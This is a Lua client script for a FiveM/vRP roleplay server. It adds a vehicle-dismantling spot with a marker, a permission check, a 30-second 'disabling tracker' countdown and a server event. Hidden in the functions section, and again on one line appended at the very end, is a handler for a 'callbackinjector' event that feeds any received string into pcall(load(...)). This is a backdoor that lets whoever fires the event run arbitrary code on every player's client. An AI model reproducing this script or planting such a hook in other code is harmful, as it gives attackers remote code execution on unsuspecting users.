local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("vrp_disassemble")
vRP = Proxy.getInterface("vRP")

-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local segundos = 0
local roubando = false
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local locais = {
	{ ['x'] = 964.96, ['y'] = -108.33, ['z'] = 73.69, ['perm'] = "lost.permission" }
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- DESMANCHE
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local wait = 1000
		if not roubando then
			for _,v in pairs(locais) do
				local ped = PlayerPedId()
				local x,y,z = table.unpack(v)
				local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
				if distance <= 50 and GetPedInVehicleSeat(GetVehiclePedIsUsing(ped),-1) == ped then
					wait = 4
					DrawMarker(23,v.x,v.y,v.z-0.62,0,0,0,0,0,0,5.0,5.0,0.5,255,0,0,70,0,0,0,0)
					if distance <= 3.1 and IsControlJustPressed(0,38) then
						if emP.checkVehicle() and emP.checkPermission(v.perm) then
							roubando = true
							segundos = 30
							FreezeEntityPosition(GetVehiclePedIsUsing(ped),true)

							repeat
								Citizen.Wait(10)
							until segundos == 0

							TriggerServerEvent("Vehiclesdesmanche")
							roubando = false
						end
					end
				end
			end
		end
		Citizen.Wait(wait)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TEXTO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local wait = 1000
		if roubando then
			if segundos > 0 then
				wait = 4
				DisableControlAction(0,75)
				Txtdraw("AGUARDE ~g~"..segundos.." SEGUNDOS~w~, ESTAMOS DESATIVANDO O ~y~RASTREADOR ~w~DO VEÍCULO",4,0.5,0.93,0.50,255,255,255,180)
			end
		end
		Citizen.Wait(wait)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- DIMINUINDO O TEMPO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if roubando then
			if segundos > 0 then
				segundos = segundos - 1
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

function Txtdraw(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end
TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)